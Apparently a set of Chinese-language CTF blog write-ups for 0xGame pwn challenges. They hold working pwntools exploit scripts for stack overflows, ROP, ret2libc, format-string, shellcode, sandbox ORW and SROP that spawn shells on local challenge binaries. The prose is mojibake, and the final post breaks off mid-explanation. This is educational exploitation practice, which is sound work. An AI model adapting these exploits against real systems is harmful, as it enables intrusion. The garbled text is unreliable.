[{"title":"0xGame2024-Week1-Pwn","url":"/2025/12/21/0xGame2024-Week1/","content":"0xGame-Week1-Pwn1.Stackoverflowå°±æ˜¯ä¸€é“ç®€å•çš„æ ˆæº¢å‡ºã€‚è¦è€ƒè™‘æ ˆå¯¹é½çš„é—®é¢˜ï¼Œä¸è¿‡ç›´æ¥æ§åˆ¶æ‰§è¡Œæµåˆ°0x4012DDå°±å¯ä»¥ç›´æ¥getshellï¼Œä¸ç”¨è€ƒè™‘æ ˆå¹³è¡¡äº†ã€‚\n\nä¸‹é¢ç»™å‡ºexpã€‚\nfrom pwn import *io = process(&#x27;./pwn&#x27;)backdoor = 0x4012ddpl = b&#x27;a&#x27; *0x28 + p64(backdoor)io.recvuntil(b&#x27;her:&#x27;)io.send(pl)io.interactive()\n\n\n\n2.Positive\nå¯ä»¥çœ‹å‡ºæ¥ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªæ— ç¬¦å·æ•°è½¬åŒ–ï¼Œä¹Ÿå°±æ˜¯å­˜åœ¨æ•´æ•°æº¢å‡ºã€‚æ‰€ä»¥æˆ‘ä»¬åªè¦è¾“å…¥bytesä¸º-1ï¼Œå°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªè¾ƒå¤§çš„è¾“å…¥é•¿åº¦ã€‚ç„¶åå°±å¯ä»¥æŒ‰ç…§ret2textå»åšäº†ã€‚\nä¸‹é¢ç»™å‡ºexpã€‚\nfrom pwn import *context.log_level = &#x27;debug&#x27;io = process(&#x27;./pwn&#x27;)backdoor =  0x401272io.recvuntil(b&#x27;walk:&#x27;)io.send(b&#x27;-1&#x27;)io.recvuntil(b&#x27;walking:&#x27;)pl = b&#x27;a&#x27;*0x38 + p64(backdoor)io.send(pl)io.interactive()\n\n\n\n3.Find_me\nè¿™æ˜¯ä¸€é“å…³äºfdçš„é¢˜ç›®ã€‚\nfdï¼Œæ–‡ä»¶æè¿°ç¬¦ã€‚æ¯æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ä¾¿ä¼šåŠ 1ã€‚stdinï¼ˆæ ‡å‡†è¾“å…¥ï¼‰â€“ 0ï¼›stdoutï¼ˆæ ‡å‡†è¾“å‡ºï¼‰â€“1ï¼›stderrï¼ˆæ ‡å‡†é”™è¯¯è¾“å‡ºï¼‰â€“2ï¼›åé¢æˆ‘ä»¬æ‰“å¼€çš„æ–‡ä»¶çš„fdå°±ä¾æ¬¡+1ã€‚æ—¢ä»3å¼€å§‹ã€‚\nidaé‡Œå¯ä»¥çœ‹å‡ºï¼Œè¿™é‡Œæ˜¯ä¸ºéšæœºã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è°ƒç”¨ctypesåº“ ï¼Œæ¥æ’i_1çš„å€¼ã€‚é‚£ä¹ˆfdçš„å€¼å°±åº”è¯¥æ˜¯i_1+3ã€‚ç”±äº è¿™é‡ŒæŠŠæ ‡å‡†è¾“å‡ºå…³äº†ï¼Œæ‰€ä»¥å¯ä»¥é‡‡ç”¨stderræ¥è¾“å‡ºflagã€‚\n\nå¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œçš„fdæ˜¯æˆ‘ä»¬è‡ªå·±å†™å…¥çš„ï¼ˆä¼ªéšæœºå¯ä»¥å¾—åˆ°flagçš„fdï¼‰ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å…ˆå‘whatåœ°å€è¯»å…¥flagï¼Œå†å†™å‡ºwhatåœ°å€é‡Œå­˜æ”¾çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯flagã€‚\nä¸‹é¢ç»™å‡ºexpã€‚\nfrom pwn import *import ctypescontext.log_level = &#x27;debug&#x27;io = process(&#x27;./pwn&#x27;)libc = ctypes.CDLL(&#x27;libc.so.6&#x27;)libc.srand(libc.time(0))fd = libc.rand() % 100 + 3print(f&#x27;fd=&#x27;,fd)io.sendlineafter(&#x27;dolls ?&#x27;,b&#x27;0&#x27;)sleep(0.2)io.sendline(str(fd))sleep(0.2)io.sendline(b&#x27;1&#x27;)sleep(0.2)io.sendline(b&#x27;2&#x27;)io.interactive()\n\n\n\n4.Where_is_my_binshä¸€ä¸ªæ­£å¸¸çš„ret2ropçš„æ‰“æ³•ã€‚å¼€å¤´è¾“å…¥&#x2F;bin&#x2F;shåœ¨bssæ®µã€‚\nä¸‹é¢ç»™å‡ºexpã€‚\nfrom pwn import *io = process(&#x27;./pwn&#x27;)io.recvuntil(b&#x27;create it:&#x27;)pl1 = b&#x27;/bin/sh\\x00&#x27; io.send(pl1)bss = 0x404090rdi = 0x401323sys = 0x401090ret = 0x4012b5pl2 = b&#x27;a&#x27;*0x18 + p64(ret) + p64(rdi) + p64(bss) + p64(sys)io.recvuntil(b&#x27;now ?&#x27;)#gdb.attach(io)io.send(pl2)io.interactive()\n\n\n\n5.Ret2csu\nå¯ä»¥çœ‹å‡ºæ¥ï¼Œå’Œä¸Šä¸€é¢˜æœ‰ç›¸ä¼¼ä¹‹å¤„ï¼Œä¹Ÿå¯ä»¥è¾“å…¥&#x2F;bin&#x2F;shåˆ°bssæ®µã€‚æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œæœ‰strlenç»•è¿‡ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥æŠŠ\\x00å½“ä½œpaddingæ¥ç»•è¿‡ã€‚ç„¶åè¿™é‡Œret2csuçš„æŠ€å·§å°±ä¸å¤šè¯´äº†ï¼Œå¯ä»¥çœ‹blogé‡Œæœ‰ä¸€ç¯‡å…³äºret2csuçš„åŸºæœ¬ç”¨æ³•ï¼Œå…³é”®æ˜¯å¯¹å„ä¸ªå¯„å­˜å™¨çš„å€¼çš„æ§åˆ¶ã€‚\nä¸‹é¢ç»™å‡ºexpã€‚\nfrom pwn import  *io = process(&#x27;./pwn&#x27;)io.recvuntil(b&#x27;her~\\n&#x27;)pl1 = b&#x27;/bin/sh\\x00&#x27; + p64(0x4010e0)io.send(pl1)io.recvuntil(b&#x27;do?\\n&#x27;)bss = 0x404098binsh = 0x404090rdi = 0x4013c3gadget1 = 0x4013BAgadget2 = 0x4013a0rbx = 0rbp = 1r12 = binshr13 = 0r14 = 0r15 = bsspl2 = b&#x27;\\x00&#x27;*0x18 + p64(gadget1) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(gadget2)#binsh_addr pop ---&gt; rdi; call r15 ---&gt; call bss ---&gt; call execvegdb.attach(io)io.send(pl2)io.interactive()\n\nç”±äºæ‰“çš„æ˜¯æœ¬åœ°ï¼Œè¿˜æœ‰ä¸¤é“é¢˜éœ€è¦ç”¨dockerfileï¼Œå°±å…ˆé¸½ç€äº†QAQã€‚\n","categories":["stack"],"tags":["pwnå…¥é—¨"]},{"title":"2025 0xGame Week1 Pwn","url":"/2025/11/11/2025-0xGame-Week1-Pwn/","content":"0xGame Week1 Pwn1.Test your ncç®€å•çš„ç­¾åˆ°é¢˜ï¼Œç†ŸçŸ¥ncçš„ç”¨æ³•å³å¯ã€‚\n\n2.å‘½ä»¤æ‰§è¡ŒåŒæ ·è¿œç«¯è¿æ¥åï¼Œå¯ä»¥ç›´æ¥è·å–shellï¼Œä¸è¿‡è¿‡æ»¤äº†catå’ŒshæŒ‡ä»¤ã€‚é€šè¿‡æ‹¼æ¥å°±å¯ä»¥æˆåŠŸè·å¾—flagã€‚\n\n3.Stack overflowæ ˆæº¢å‡ºã€‚å…ˆä¸¢è¿›idaæŸ¥çœ‹ï¼Œå‘ç°backdoorï¼Œå´æ˜¯å‡çš„ï¼Œä½†æ˜¯whhhatç»™å‡ºäº†shellã€‚å†çœ‹mainå‡½æ•°ï¼Œçœ‹åˆ°äº†readå±é™©å‡½æ•°ï¼Œå¹¶ä¸”å­˜åœ¨æº¢å‡ºçš„æœºä¼šã€‚\n\n\nç®€å•è¯´ä¸€ä¸‹expï¼Œé¦–å…ˆæ˜¯å¯¹pwnå·¥å…·åº“çš„ä¸€ä¸ªè°ƒç”¨ï¼Œä¹‹åæ˜¯å¯¹è¿œç«¯çš„è¿æ¥ï¼Œå¦‚æœæ˜¯åœ¨è™šæ‹Ÿæœºä¸Šè¿æ¥è¿œç«¯ç¯å¢ƒç”¨remoteï¼Œå¦‚æœåœ¨ç‰©ç†æœºä¸Šåˆ™ç”¨connectï¼Œè°ƒè¯•ä¹Ÿå¯ä»¥ç”¨processæŒ‡ä»¤ã€‚è§‚å¯Ÿidaå¯ä»¥çœ‹å‡ºè·ç¦»rbpä¸º0x30åˆæœ‰0x8ï¼ˆ64ä½ä¸‹ï¼‰çš„å¤§å°å­˜æ”¾rbpï¼Œæ‰€ä»¥è·ç¦»ret_addrå®é™…ä¸Šæ˜¯0x38çš„å¤§å°ï¼Œæ‰€ä»¥å¡«å……0x38çš„paddingæ¥ä½¿å‡½æ•°è¿”å›è‡³åé—¨å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯shellçš„åœ°å€ï¼ˆåœ¨idaä¸­æ‰¾å‡ºï¼Œè¿™é‡Œä¸åšæ¼”ç¤ºï¼‰ã€‚æœ€ågetshellã€‚\n\n4.ROP1ropé“¾æ˜¯pwnçš„ä¸€ç§å¸¸è§æ”»å‡»æ‰‹æ®µï¼Œå¯ä»¥ä¸Šç½‘çœ‹çœ‹åŸç†ã€‚æŠŠé™„ä»¶ä¸¢è¿›idaä¸­\n\nå¯ä»¥çœ‹åˆ°æœ‰gadgetå‡½æ•°ï¼Œå¯ä»¥åœ¨idaä¸­æŸ¥çœ‹gadgetçš„åœ°å€ä¸º0x40117Eï¼Œä¹Ÿå¯ä»¥åœ¨bashä¸­ç”¨æŒ‡ä»¤ï¼ˆROPgadget â€“binary â€œæ–‡ä»¶åâ€ â€“only â€œpop|retâ€ | grep â€œrdiâ€ï¼‰è·å¾—åœ°å€ã€‚\n\nç”±äºåœ¨idaä¸­æ‰¾ä¸åˆ°shç›¸å…³çš„å­—ç¬¦ä¸²ï¼Œäºæ˜¯å¯ä»¥ä»gdbä¸­è·å–ï¼ˆå½“ç„¶é€‰æ‹©åœ¨helpä¸­ç”¨åç§»ä¹Ÿæ˜¯å¯ä»¥æ‰“é€šçš„ï¼‰\n\nä»è€Œå¯ä»¥æ„é€ exp\n\nç”±äºubuntuçš„ç‰ˆæœ¬ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦è¿›è¡Œæ ˆå¯¹é½ï¼Œä¹Ÿå°±æ˜¯payloadä¸­p64(ret)çš„ç”±æ¥ã€‚è¿™é‡Œçš„retæ˜¯ä»»æ„çš„ä¸€ä¸ªret_addrï¼Œå› ä¸ºå…¶å¤§å°ä¸º1ï¼Œæ‰€ä»¥å¯ä»¥èµ·åˆ°ä¸€ä¸ªå¯¹é½çš„ä½œç”¨ã€‚ï¼ˆå› ä¸ºæˆ‘ä¹Ÿä¸å®Œå…¨æ¸…æ¥šå…¶èƒŒåçš„åŸç†QAQï¼‰\n5.ROP2è¿™é“é¢˜çš„è§£æ³•å…¶å®å’Œä¸Šä¸€é“rop1ç±»ä¼¼ï¼Œä¸è¿‡ç”±äºè¿‡æ»¤æ‰äº†shï¼Œbashç­‰shç±»æŒ‡ä»¤ï¼Œæ‰€ä»¥è¿™è¾¹å¯ä»¥è”æƒ³åˆ°$0è¿™ä¸ªç¥å¥‡çš„å‚æ•°ä¹Ÿå¯ä»¥èµ·åˆ°ä¸€ä¸ªshellçš„ä½œç”¨ã€‚\n\nexpå¦‚ä¸‹å›¾\n\nweek1è‡³æ­¤ç»“æŸï¼Œè‡³äºè¿˜æœ‰ä¸€é“ç®€å•æ•°å­¦é¢˜ï¼Œå¯¹pythonè¯­æ³•è¦æ±‚è¾ƒé«˜ï¼Œæˆ‘å°±ä¸åœ¨æ­¤å™è¿°ã€‚ï¼ˆç»å¯¹ä¸æ˜¯æˆ‘èœQWQï¼‰\n","categories":["stack"],"tags":["pwnå…¥é—¨"]},{"title":"0xGame2024-Week2-Pwn","url":"/2025/12/21/0xGame2024-Week2/","content":"0xGame-Week2-Pwn1.Boomæ ¹æ®é¢˜ç›®å°±å¯ä»¥ç®€å•æ¨æµ‹æ˜¯ä¸€é“çˆ†ç ´é¢˜ã€‚\n\nå¯ä»¥çœ‹å‡ºï¼Œè¿™é‡Œåªéœ€è¦æ»¡è¶³æˆ‘ä»¬è¾“å…¥çš„bufå’Œsecretç›¸åŒå°±å¯ä»¥ã€‚å¯ä»¥è¿™é‡Œçš„secretåœ¨bssæ®µä¸Šï¼Œè€Œæˆ‘ä»¬å¡«å…¥çš„bufåœ¨æ ˆä¸Šï¼Œè¯»å–é•¿åº¦ä¹Ÿä¸å¤Ÿæº¢å‡ºï¼Œè¿˜æ²¡æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œé‚£æˆ‘ä»¬è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ\nè¿™é‡Œçš„æ¼æ´åœ¨strcmpä¸Šï¼Œç”±äºstrcmpæœ‰\\x00æˆªæ–­çš„ç‰¹æ€§ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥èµŒéšæœºæ•°secretçš„ç¬¬ä¸€ä½æ˜¯\\x00ï¼Œå°±å¯ä»¥æ‰“é€šäº†ã€‚ï¼ˆinitå‡½æ•°é‡Œå¯ä»¥çœ‹å‡ºsecretæ˜¯ä¸€ä¸ªçœŸéšæœºæ•°ï¼‰\nä¸‹é¢ç»™å‡ºexpã€‚\nfrom pwn import *while True:    io=process(&#x27;./pwn&#x27;)    io.recvuntil(b&#x27;thinking?&#x27;)    io.send(b&#x27;\\x00&#x27;)    try:        io.recvuntil(b&#x27;gift.&#x27;)        io.interactive()    except:        io.close()\n\n\n\n2.Fmt\nå¯ä»¥çœ‹å‡ºæ¥ä¿æŠ¤åŸºæœ¬éƒ½å…¨å¼€äº†ã€‚\n\nå¯ä»¥çœ‹å‡ºï¼Œæˆ‘ä»¬è¯»å–äº†flagæ–‡ä»¶çš„å†…å®¹åˆ°flagåœ°å€ï¼ˆbssæ®µï¼‰ã€‚é‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬åªè¦èƒ½å¤ŸçŸ¥é“flagåœ°å€çš„çœŸå®åœ°å€ï¼ˆpieä¿æŠ¤ï¼‰ï¼Œå°±å¯ä»¥é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå°†flagçš„å†…å®¹è¾“å‡ºã€‚\næ‰€ä»¥æˆ‘ä»¬éœ€è¦å»æ³„éœ²ç¨‹åºçš„åŸºå€ã€‚\nä¸‹é¢ç»™å‡ºexpã€‚\nfrom pwn import *io = process(&#x27;./pwn&#x27;)io.recvuntil(b&#x27;something:&#x27;)pl1 = b&#x27;%9$p&#x27;io.send(pl1)io.recvuntil(b&#x27;0x&#x27;)pro_base = int(io.recv(12),16) - 0x1140success(hex(pro_base))flag = pro_base + 0x40c0pl2  = b&#x27;%7$s%7$s&#x27; + p64(flag)io.recvuntil(b&#x27;something:&#x27;)io.send(pl2)io.interactive()\n\nè¿™é‡Œå¯ä»¥é€šè¿‡æ•°æ®æµ‹è¯•ï¼Œè¯»å‡ºoffest &#x3D; 6ï¼Œç„¶åé€šè¿‡gdbåŠ¨è°ƒï¼ˆè®°å¾—æ¢ä¾èµ–ï¼‰è¯»å‡ºåœ¨9çš„åç§»å¤„å­˜åœ¨_startçš„åœ°å€ï¼Œä»è€Œå¯ä»¥è·å–pro_baseã€‚\n\nè¿™é‡Œå†™å…¥%7$s%7$sæ˜¯åœ¨offset &#x3D; 6 å¤„çš„ä½ç½®ï¼Œæ‰€ä»¥flagçš„åœ°å€è‡ªç„¶åç§»é‡å°±æ˜¯7ã€‚è¿™é‡Œç”¨äº†ä¸¤ä¸ª%7$sæ˜¯ä¸ºäº†ä¿æŒæˆ‘ä»¬å¡«å…¥çš„p64(flag)åˆšå¥½å°±æ˜¯åœ¨åç§»7çš„ä½ç½®ã€‚\n3.Ret2libcä¸€é“å¾ˆå…¸å‹çš„ret2libcã€‚è¿™é‡Œå°±ä¸è¿‡å¤šèµ˜è¿°ã€‚è¯¦ç»†åšæ³•è¯¦è§25å¹´week2çš„wpã€‚\nä¸‹é¢ç»™å‡ºexpã€‚\nfrom pwn import *io = process(&#x27;./pwn&#x27;)elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)puts_got = elf.got.putsputs_plt = elf.plt.putsrdi = 0x4012c3ret = 0x401235vuln = elf.sym.vulnpl1 = b&#x27;a&#x27;*0x28 + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)io.recvuntil(b&#x27;libc ?&#x27;)io.send(pl1)base = u64(io.recvuntil(b&#x27;\\x7f&#x27;)[-6:]+b&#x27;\\x00\\x00&#x27;) - libc.sym.putssuccess(hex(base))sys = base + libc.sym.systembinsh = base + next(libc.search(b&#x27;/bin/sh\\x00&#x27;))pl2 = b&#x27;a&#x27;*0x28 + p64(ret) + p64(rdi) + p64(binsh) + p64(sys)io.recvuntil(b&#x27;libc ?&#x27;)io.send(pl2)io.interactive()\n\n\n\n4.Shellcode-lv0å¯ä»¥çœ‹å‡ºè¿™é‡Œç»™bufå¯æ‰§è¡Œæƒé™ï¼Œæœ€ååˆå»calläº†bufã€‚æ‰€ä»¥åªè¦æˆ‘ä»¬å‘bufä¸Šå¡«å…¥shellcodeï¼Œå°±å¯ä»¥å®ç°getshellã€‚ä¸è¿‡è¿™é‡Œå»å¯¹256å–æ¨¡äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸çŸ¥é“å®ƒå…·ä½“callçš„æ˜¯bufä¸Šçš„å“ªçš„åœ°å€ã€‚è¿™æ—¶å€™å°±å¯ä»¥æƒ³åˆ°ç”¨nopçš„æ–¹å¼ï¼Œä½¿æ‰§è¡Œæµæ…¢æ…¢æ»‘åˆ°æˆ‘ä»¬å†™å…¥çš„shellcodeçš„åœ°æ–¹ã€‚\nä¸‹é¢ç»™å‡ºexpã€‚\nfrom pwn import *context.arch = &#x27;amd64&#x27;io = process(&#x27;./pwn&#x27;)io.recvuntil(b&#x27;run: &#x27;)pl = asm(shellcraft.sh())pl = pl.rjust(0x100,b&#x27;\\x90&#x27;)#nopgdb.attach(io)io.send(pl)io.interactive()\n\nåšå®Œçœ‹wpï¼Œæ‰çŸ¥é“å‡ºé¢˜äººå®é™…æƒ³æŠŠnopç»™banäº†ï¼Œä½†æ˜¯å¥½åƒå¹¶ä¸å½»åº•ã€‚é‚£æˆ‘ä»¬å¯ä»¥ç”¨\\x91ï¼Œä¹Ÿå°±æ˜¯xchg eax,ecxæ¥å°†eaxæ¸…é›¶ã€‚æ‰€ä»¥å®é™…ä¸Šï¼Œåªè¦ä¸å½±å“ç¨‹åºç»è¡Œçš„æŒ‡ä»¤éƒ½å¯ä»¥ç§°ä½œnopï¼Œè¿™é‡Œéƒ½å¯ä»¥ç”¨æ¥å¡«å……ã€‚\n5.Shellcode-lv1è¿™é‡Œç›¸å¯¹äºlv0ï¼Œå¤šå¢åŠ äº†ä¸€ä¸ªæ²™ç®±ã€‚æˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹è¿™é‡Œçš„æ²™ç®±åšäº†ä»€ä¹ˆã€‚\n\nå¯ä»¥çœ‹å‡ºexecveå’Œexecveatéƒ½è¢«è¿‡æ»¤æ‰äº†ã€‚ä¹Ÿå°±æ˜¯è¯´openï¼Œreadï¼Œwriteéƒ½æ˜¯å…è®¸çš„ã€‚è¿™é‡Œå°±æ˜¯æ‰€è°“çš„orwã€‚\nä¸‹é¢ç»™å‡ºexpã€‚\nfrom pwn import *context.arch = &#x27;amd64&#x27;io = process(&#x27;./pwn&#x27;)io.recvuntil(b&#x27;run: &#x27;)shell = shellcraft.open(&quot;flag&quot;,0,0) + shellcraft.read(3,&quot;rsp&quot;,0x100) + shellcraft.write(1,&quot;rsp&quot;,0x100)pl = asm(shell).rjust(0x100,b&#x27;\\x90&#x27;)io.send(pl)io.interactive()\n\nå¯ä»¥çœ‹å‡ºå’Œlv0çš„å·®åˆ«ä¸å¤§ï¼Œä¸è¿‡è¿™é‡Œæ˜¯æŠŠshellcraft.sh()çš„æŒ‡ä»¤æ¢æˆäº†openï¼Œreadï¼Œwriteï¼Œåç»­æ˜¯ä¸€æ ·çš„ã€‚\n6.Fmt+shellcode\nå¯ä»¥çœ‹å‡ºè¿™é‡Œç»™0x114514000çš„åœ°å€å¯æ‰§è¡Œæƒé™ï¼Œåé¢è¿˜calläº†0x114514000ã€‚æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å¾€è¿™ä¸ªåœ°å€é‡Œå†™å…¥shellcodeå°±å¯ä»¥getshelläº†ã€‚é‚£ä¹ˆå°±è¦ä¿è¯keyçš„å€¼æ˜¯26318864ã€‚è¿™é‡Œå°±å¯ä»¥ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ¥ä¿®æ”¹keyçš„å€¼äº†ã€‚\nä¸‹é¢ç»™å‡ºexpã€‚\nfrom pwn import * context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;io = process(&#x27;./pwn&#x27;)io.recvuntil(&#x27;something:&#x27;)io.send(b&#x27;%9$p&#x27;)io.recvuntil(b&#x27;0x&#x27;)pro_base = int(io.recv(12),16) - 0x1140success(hex(pro_base))key = 0x4068 + pro_base #0x191 9180pl1 = b&#x27;%38928c&#x27;+b&#x27;%8$hn&#x27;#gdb + åŒå­—èŠ‚å†™å…¥ ---&gt;\\x80 \\x91pl1 = pl1.ljust(0x10,b&#x27;a&#x27;) + p64(key)io.recvuntil(&#x27;something:&#x27;)#gdb.attach(io)io.send(pl1)pl2 = b&#x27;%401c&#x27; + b&#x27;%8$hn&#x27; #---&gt;\\x91 \\x01pl2 = pl2.ljust(0x10,b&#x27;a&#x27;) + p64(key+2)io.recvuntil(b&#x27;something:&#x27;)#gdb.attach(io)io.send(pl2)io.recvuntil(b&#x27;something:&#x27;)gdb.attach(io)io.send(b&#x27;stop\\x00&#x27;)#é€€å‡ºå¾ªç¯ï¼Œcallå‡½æ•°io.recvuntil(b&#x27;say!&#x27;)pl3 = asm(shellcraft.sh())io.send(pl3)io.interactive()\n\n\n\n7.Syscallint __fastcall __noreturn main(int argc, const char **argv, const char **envp)&#123;  int n3; // [rsp+8h] [rbp-58h] BYREF  int sysno; // [rsp+Ch] [rbp-54h] BYREF  unsigned int i_1; // [rsp+10h] [rbp-50h] BYREF  signed int i; // [rsp+14h] [rbp-4Ch]  int v7; // [rsp+18h] [rbp-48h]  int avail_buffer; // [rsp+1Ch] [rbp-44h]  __int64 s; // [rsp+20h] [rbp-40h] BYREF  __int64 v10; // [rsp+28h] [rbp-38h]  __int64 v11; // [rsp+30h] [rbp-30h]  __int64 v12; // [rsp+38h] [rbp-28h]  __int64 v13; // [rsp+40h] [rbp-20h]  __int64 v14; // [rsp+48h] [rbp-18h]  unsigned __int64 v15; // [rsp+58h] [rbp-8h]  v15 = __readfsqword(0x28u);  bufinit();  while ( 1 )  &#123;    puts(&quot;1. Prepare a buffer&quot;);    puts(&quot;2. Recycle a buffer&quot;);    puts(&quot;3. Initiate a syscall with glibc wrapper&quot;);    printf(&quot;Your choice: &quot;);    __isoc99_scanf(&quot;%d&quot;, &amp;n3);    if ( n3 == 3 )    &#123;      puts(&quot;Now I will initiate a syscall with glibc wrapper&quot;);      printf(&quot;Which syscall do you want to call: &quot;);      __isoc99_scanf(&quot;%d&quot;, &amp;sysno);      printf(&quot;Input the arguments count: &quot;);      __isoc99_scanf(&quot;%d&quot;, &amp;i_1);      s = 0LL;      v10 = 0LL;      v11 = 0LL;      v12 = 0LL;      v13 = 0LL;      v14 = 0LL;      memset(&amp;s, 0, 0x30uLL);      for ( i = 0; i &lt; (int)i_1; ++i )      &#123;        printf(&quot;Input the argument %d: &quot;, i);        __isoc99_scanf(&quot;%llu&quot;, &amp;s + i);      &#125;      printf(&quot;Initating syscall %d with %d arguments\\n&quot;, sysno, i_1);      v7 = syscall(sysno, s, v10, v11, v12, v13, v14);      printf(&quot;Syscall returned with code %d\\n&quot;, v7);LABEL_18:      puts(&quot;Invalid choice&quot;);    &#125;    else    &#123;      if ( n3 &gt; 3 )        goto LABEL_18;      if ( n3 == 1 )      &#123;        avail_buffer = find_avail_buffer();        if ( avail_buffer == -1 )        &#123;          puts(&quot;No available buffer&quot;);        &#125;        else        &#123;          buffers[avail_buffer] = malloc(0x400uLL);          printf(            &quot;Buffer %d is prepared. Size: %d, located at %p\\n&quot;,            avail_buffer,            1024,            (const void *)buffers[avail_buffer]);          printf(&quot;Input your data: &quot;);          read(0, (void *)buffers[avail_buffer], 0x400uLL);          puts(&quot;Data is stored&quot;);        &#125;      &#125;      else      &#123;        if ( n3 != 2 )          goto LABEL_18;        printf(&quot;Which buffer do you want to recycle: &quot;);        __isoc99_scanf(&quot;%d&quot;, &amp;i_1);        if ( i_1 &lt;= 5 &amp;&amp; buffers[i_1] )        &#123;          free((void *)buffers[i_1]);          buffers[i_1] = 0LL;          printf(&quot;Buffer %d is recycled\\n&quot;, i_1);        &#125;        else        &#123;          puts(&quot;Invalid buffer&quot;);        &#125;      &#125;    &#125;  &#125;&#125;\n\nå¾ˆæœ‰æ„æ€çš„ä¸€é“é¢˜ï¼Œå°±ç›¸å½“äºæŠŠsyscallæ•™å­¦äº†ä¸€éã€‚\næˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ›å»ºä¸€å—ç¼“å­˜åŒºï¼Œç„¶åå‘è¿™å—ç¼“å­˜åŒºé‡Œæ”¾å…¥&#x2F;bin&#x2F;shï¼Œè€Œä¸”bufçš„åœ°å€æ˜¯ç»™æˆ‘ä»¬çš„ã€‚ç„¶åå¯¹è¿™å—bufè¿›è¡Œåˆå§‹åŒ–ã€‚å¯ä»¥é€šè¿‡æˆ‘ä»¬çš„è¾“å…¥ï¼Œæ§åˆ¶ç³»ç»Ÿè°ƒç”¨å·ï¼Œå‚æ•°ä¸ªæ•°ï¼Œå„ä¸ªå‚æ•°å¯¹åº”çš„å¯„å­˜å™¨çš„å–å€¼ã€‚ä¸éš¾ï¼Œä½†æ˜¯è¦é™æ€åˆ†æç¨‹åºåœ¨åšä»€ä¹ˆã€‚\nä¸‹é¢ç»™å‡ºexpã€‚\nfrom pwn import *context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;io = process(&#x27;./pwn&#x27;)io.recvuntil(b&#x27;choice: &#x27;)io.sendline(b&#x27;1&#x27;)io.recvuntil(b&#x27;0x&#x27;)rdi = int(io.recv(12),16)success(hex(rdi))io.recvuntil(b&#x27;data: &#x27;)io.send(b&#x27;/bin/sh\\x00&#x27;)io.recvuntil(b&#x27;choice: &#x27;)io.sendline(b&#x27;3&#x27;)io.recvuntil(b&#x27;call: &#x27;)io.sendline(b&#x27;59&#x27;)io.recvuntil(b&#x27;count: &#x27;)io.sendline(b&#x27;3&#x27;)rsi = b&#x27;0&#x27;rdx = b&#x27;0&#x27;rdi = str(rdi)for i in [rdi,rsi,rdx]:    io.sendlineafter(b&#x27;: &#x27;,i)io.interactive()\n\n\n\n8.Srop\nå¯ä»¥çœ‹è¿™é‡Œè°ƒç”¨äº†sys_readå’Œsys_writeå‡½æ•°ï¼Œæ‰€ä»¥è€ƒè™‘sropçš„æ‰“æ³•ã€‚\nä¸‹é¢ç»™å‡ºexpã€‚\nfrom pwn import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level = &#x27;debug&#x27;)io = process(&#x27;./pwn&#x27;)syscall_ret = 0x40100as1 = SigreturnFrame()s1.rax = 0s1.rdi = 0s1.rsi = 0x402800 #datas1.rdx = 0x1000s1.rip = syscall_rets1.rsp = 0x402800pl1 = b&#x27;a&#x27;*15pl1 = pl1.ljust(0x50,b&#x27;\\x00&#x27;) + p64(syscall_ret) + bytes(s1)io.recvuntil(b&#x27;Hello&gt; &#x27;)#gdb.attach(io)io.send(pl1)sleep(1)io.send(p64(0x401021))s2 = SigreturnFrame()s2.rax = 59s2.rdi = 0x4027c8 #gdbs2.rsi = 0s2.rdx = 0s2.rsp = 0x402800s2.rip = syscall_retio.recvuntil(b&#x27;&gt; &#x27;)pl2 = b&#x27;a&#x27;*15 + b&#x27;\\x00&#x27; + b&#x27;/bin/sh\\x00&#x27;pl2 = pl2.ljust(0x50,b&#x27;\\x00&#x27;) + p64(syscall_ret) + bytes(s2) #gdb.attach(io)io.send(pl2)io.interactive()\n\nè§£é‡Šä¸€ä¸‹expã€‚è¿™é‡Œçš„s1æ˜¯å»æ„é€ äº†readå‡½æ•°ï¼Œå°†æˆ‘ä»¬åé¢å‘é€çš„0x401021å…¥è¯»åˆ°0x402800çš„ä½ç½®ï¼Œç„¶åripå¤„è®¾ç½®çš„æ˜¯syscall_retæŒ‡ä»¤ï¼Œretå°±ä¼šæŠŠæ ˆé¡¶çš„å€¼popç»™ripï¼Œæ‰€ä»¥å°±ä¼šè¿”å›sub_401021å‡½æ•°äº†ï¼Œç»§ç»­æ‰§è¡Œä¸‹é¢çš„ç¨‹åºã€‚pl1å…ˆå¡«å…¥a*15ï¼Œæ˜¯é€šè¿‡writeå‡½æ•°ä¸­æœ‰ç±»ä¼¼strlençš„åŠŸèƒ½ï¼Œå¯ä»¥æ§åˆ¶å­—ç¬¦ä¸²é•¿åº¦ï¼Œä»è€Œå°†raxçš„å€¼è®¾ç½®ä¸º0xfæ¥è°ƒç”¨sigreturnã€‚åé¢å°±ä¼šæ‰§è¡Œæˆ‘ä»¬æ„é€ 